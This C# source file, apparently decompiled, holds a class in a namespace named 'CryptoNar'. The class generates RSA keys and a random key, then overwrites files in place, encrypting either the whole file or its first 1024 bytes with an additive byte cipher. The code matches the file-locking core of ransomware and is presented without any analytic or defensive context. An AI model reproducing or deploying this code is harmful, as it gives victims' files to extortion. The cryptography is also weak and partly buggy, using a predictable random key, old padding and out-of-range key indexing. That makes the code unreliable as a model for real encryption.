using System;
using System.IO;
using System.Security.Cryptography;

namespace CryptoNar;

internal class CryptoClass
{
	private readonly Random _rnd = new Random();

	private readonly bool _optimalAsymmetricEncryptionPadding = false;

	public string EncryptionKey { get; private set; }

	public CryptoClass()
	{
		EncryptionKey = GenerateRandomString(20);
	}

	public CryptoClass(string encryptionKey)
	{
		EncryptionKey = encryptionKey;
	}

	public void GenerateKeys(int keySize, out string publicKey, out string publicAndPrivateKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
		publicKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		publicAndPrivateKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true);
	}

	public byte[] RsaEncryption(byte[] data, int keySize, string publicKeyXml)
	{
		if (data == null || data.Length == 0)
		{
			throw new ArgumentException("Data are empty", "data");
		}
		int maxDataLength = GetMaxDataLength(keySize);
		if (data.Length > maxDataLength)
		{
			throw new ArgumentException($"Maximum data length is {maxDataLength}", "data");
		}
		if (!IsKeySizeValid(keySize))
		{
			throw new ArgumentException("Key size is not valid", "keySize");
		}
		if (string.IsNullOrEmpty(publicKeyXml))
		{
			throw new ArgumentException("Key is null or empty", "publicKeyXml");
		}
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
		rSACryptoServiceProvider.FromXmlString(publicKeyXml);
		return rSACryptoServiceProvider.Encrypt(data, _optimalAsymmetricEncryptionPadding);
	}

	public byte[] RsaDecryption(byte[] data, int keySize, string publicAndPrivateKeyXml)
	{
		if (data == null || data.Length == 0)
		{
			throw new ArgumentException("Data are empty", "data");
		}
		if (!IsKeySizeValid(keySize))
		{
			throw new ArgumentException("Key size is not valid", "keySize");
		}
		if (string.IsNullOrEmpty(publicAndPrivateKeyXml))
		{
			throw new ArgumentException("Key is null or empty", "publicAndPrivateKeyXml");
		}
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(keySize);
		rSACryptoServiceProvider.FromXmlString(publicAndPrivateKeyXml);
		return rSACryptoServiceProvider.Decrypt(data, _optimalAsymmetricEncryptionPadding);
	}

	public void EncryptFileFully(string filePath)
	{
		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		byte[] array = new byte[stream.Length];
		using (BinaryReader binaryReader = new BinaryReader(stream))
		{
			using BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryReader.BaseStream.Position = 0L;
			array = binaryReader.ReadBytes((int)stream.Length);
			binaryWriter.BaseStream.Position = 0L;
			array = EncodeAob(array, GetBytes(EncryptionKey));
			binaryWriter.Write(array);
		}
		stream.Close();
		stream.Dispose();
	}

	public void DecryptFileFully(string filePath)
	{
		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		byte[] array = new byte[stream.Length];
		using (BinaryReader binaryReader = new BinaryReader(stream))
		{
			using BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryReader.BaseStream.Position = 0L;
			array = binaryReader.ReadBytes((int)stream.Length);
			binaryWriter.BaseStream.Position = 0L;
			array = DecodeAob(array, GetBytes(EncryptionKey));
			binaryWriter.Write(array);
		}
		stream.Close();
		stream.Dispose();
	}

	public void EncryptFilePartially(string filePath)
	{
		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		byte[] array = new byte[1024];
		using (BinaryReader binaryReader = new BinaryReader(stream))
		{
			using BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryReader.BaseStream.Position = 0L;
			array = binaryReader.ReadBytes(1024);
			binaryWriter.BaseStream.Position = 0L;
			array = EncodeAob(array, GetBytes(EncryptionKey));
			binaryWriter.Write(array);
		}
		stream.Close();
		stream.Dispose();
	}

	public void DecryptFilePartially(string filePath)
	{
		Stream stream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		byte[] array = new byte[1024];
		using (BinaryReader binaryReader = new BinaryReader(stream))
		{
			using BinaryWriter binaryWriter = new BinaryWriter(stream);
			binaryReader.BaseStream.Position = 0L;
			array = binaryReader.ReadBytes(1024);
			binaryWriter.BaseStream.Position = 0L;
			array = DecodeAob(array, GetBytes(EncryptionKey));
			binaryWriter.Write(array);
		}
		stream.Close();
		stream.Dispose();
	}

	private byte[] EncodeAob(byte[] aobToEncode, byte[] passwordBytes)
	{
		byte[] array = new byte[aobToEncode.Length];
		int num = 0;
		for (int i = 0; i < aobToEncode.Length; i++)
		{
			array[i] = (byte)(aobToEncode[i] + passwordBytes[num]);
			num = ((passwordBytes[num + 1] != 0) ? (num + 1) : 0);
		}
		return array;
	}

	private byte[] DecodeAob(byte[] aobToDecode, byte[] passwordBytes)
	{
		byte[] array = new byte[aobToDecode.Length];
		int num = 0;
		for (int i = 0; i < aobToDecode.Length; i++)
		{
			array[i] = (byte)(aobToDecode[i] - passwordBytes[num]);
			num = ((passwordBytes[num + 1] != 0) ? (num + 1) : 0);
		}
		return array;
	}

	private string GenerateRandomString(int length)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		string text2 = "";
		for (int i = 0; i < length; i++)
		{
			text2 += text[_rnd.Next(text.Length)];
		}
		return text2;
	}

	private int GetMaxDataLength(int keySize)
	{
		if (_optimalAsymmetricEncryptionPadding)
		{
			return (keySize - 384) / 8 + 7;
		}
		return (keySize - 384) / 8 + 37;
	}

	private bool IsKeySizeValid(int keySize)
	{
		return keySize >= 384 && keySize <= 16384 && keySize % 8 == 0;
	}

	private byte[] GetBytes(string str)
	{
		byte[] array = new byte[str.Length * 2];
		Buffer.BlockCopy(str.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}

	private string GetString(byte[] bytes)
	{
		char[] array = new char[bytes.Length / 2];
		Buffer.BlockCopy(bytes, 0, array, 0, bytes.Length);
		return new string(array);
	}
}
